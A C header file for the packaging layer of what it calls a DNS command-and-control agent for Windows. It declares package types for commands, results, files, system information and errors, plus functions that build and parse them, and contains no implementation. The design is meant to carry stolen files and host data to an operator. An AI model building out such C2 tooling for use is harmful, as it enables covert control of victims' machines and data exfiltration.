/**
 * Package.h - Data packaging for DNS C2 Agent
 */

 #ifndef PACKAGE_H
 #define PACKAGE_H
 
 #include <windows.h>
 
 // Package types
 typedef enum {
     PACKAGE_TYPE_COMMAND = 0x01,
     PACKAGE_TYPE_RESULT = 0x02,
     PACKAGE_TYPE_FILE = 0x03,
     PACKAGE_TYPE_SYSINFO = 0x04,
     PACKAGE_TYPE_ERROR = 0x05
 } PackageType;
 
 // Create a data package
 unsigned char* create_package(PackageType type, const unsigned char* data, size_t data_len, size_t* package_len);
 
 // Parse a data package
 BOOL parse_package(const unsigned char* package, size_t package_len, PackageType* type, unsigned char** data, size_t* data_len);
 
 // Create a command package
 unsigned char* create_command_package(const char* command, size_t* package_len);
 
 // Create a result package
 unsigned char* create_result_package(const char* result, size_t* package_len);
 
 // Create a file package
 unsigned char* create_file_package(const unsigned char* file_data, size_t file_len, size_t* package_len);
 
 // Create a system info package
 unsigned char* create_sysinfo_package(const char* system_info, size_t* package_len);
 
 // Create an error package
 unsigned char* create_error_package(const char* error, size_t* package_len);
 
 #endif // PACKAGE_H
 